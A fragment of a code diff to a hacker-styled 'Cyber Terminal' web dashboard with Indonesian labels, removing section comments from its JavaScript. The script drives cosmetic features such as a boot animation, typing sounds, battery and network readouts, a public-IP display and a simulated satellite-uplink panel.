     if(dist>60)cmpArrived=false;
     cmpStatus(head!=null?'LOCKED — ikuti jarum cyan':'LOCKED — arah kompas belum kalibrasi');
@@ -1136,9 +1143,6 @@ addLog('System ready v2');
 (function(){
   'use strict';
 
-  // ══════════════════════════════════════
-  // 1. BOOT SEQUENCE
-  // ══════════════════════════════════════
   var bootLines = [
     '[ OK ] Initializing CYBER TERMINAL v2.0...',
     '[ OK ] Loading kernel modules...',
@@ -1177,9 +1181,6 @@ addLog('System ready v2');
     }
   }, 220);
 
-  // ══════════════════════════════════════
-  // 4. TYPING SOUND GLOBAL + 9. VOLUME
-  // ══════════════════════════════════════
   var volLevel = 0.3;
   try { var vs = localStorage.getItem('volLevel'); if(vs) volLevel = parseFloat(vs); } catch(e){}
   var volEl = document.getElementById('volSlider');
@@ -1214,9 +1215,6 @@ addLog('System ready v2');
     if(t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA')) typeBeep();
   }, true);
 
-  // ══════════════════════════════════════
-  // 7. BATTERY + NETWORK
-  // ══════════════════════════════════════
   function updateBattery(){
     if(!navigator.getBattery) return;
     navigator.getBattery().then(function(b){
@@ -1252,9 +1250,6 @@ addLog('System ready v2');
   updateNet();
   if(navigator.connection) navigator.connection.addEventListener('change', updateNet);
 
-  // ══════════════════════════════════════
-  // 8. DECRYPTING OVERLAY
-  // ══════════════════════════════════════
   var decryptOverlay = document.getElementById('decryptOverlay');
   var dcHex = document.getElementById('dcHex');
   var dcFill = document.getElementById('dcFill');
@@ -1286,9 +1281,6 @@ addLog('System ready v2');
     }, 90);
   };
 
-  // ══════════════════════════════════════
-  // 11. IP INFO PANEL
-  // ══════════════════════════════════════
   fetch('https://ipapi.co/json/').then(function(r){ return r.json(); }).then(function(d){
     var ipEl = document.getElementById('ipPub');
     if(!ipEl) return;
@@ -1302,9 +1294,6 @@ addLog('System ready v2');
     if(ipEl) ipEl.textContent = 'Gagal memuat';
   });
 
-  // ══════════════════════════════════════
-  // 12. CLOCK 3-IN-1
-  // ══════════════════════════════════════
   function pad(n){ return String(n).padStart(2,'0'); }
   setInterval(function(){
     var d = new Date();
@@ -1316,9 +1305,6 @@ addLog('System ready v2');
     if(unixEl) unixEl.textContent = Math.floor(d.getTime()/1000);
   }, 1000);
 
-  // ══════════════════════════════════════
-  // 15. SATELLITE UPLINK PANEL
-  // ══════════════════════════════════════
   var satStatuses = ['MENGHUBUNGKAN SATELIT...','SINKRONISASI ORBIT...','LOCK ON SIGNAL','UPLINK STABIL','SATELIT AKTIF'];
   var si = 0;
   setInterval(function(){
@@ -1341,9 +1327,6 @@ addLog('System ready v2');
     }
   }, 1800);
 
-  // ══════════════════════════════════════
-  // HOOK: Decrypt saat data baru masuk
-  // ══════════════════════════════════════
   var hasilEl = document.getElementById('hasil');
   if(hasilEl && window.MutationObserver){
     var firstMut = true;
@@ -1354,7 +1337,7 @@ addLog('System ready v2');
     observer.observe(hasilEl, { childList: true, subtree: true });
   }
 
-  console.log('%c[CYBER TERMINAL] Fitur tambahan aktif: Boot, TypingSound, Battery, Network, Decrypt, Volume, Radar, IP, Clock, Satellite', 'color:#00ff41;font-weight:bold');
+  console.log('%c[CYBER TERMINAL] Fitur aktif: Boot, TypingSound, Battery, Network, Decrypt, Volume, Radar, IP, Clock, Satellite, ICU Sound', 'color:#00ff41;font-weight:bold');
 })();
 </script>
 </body>
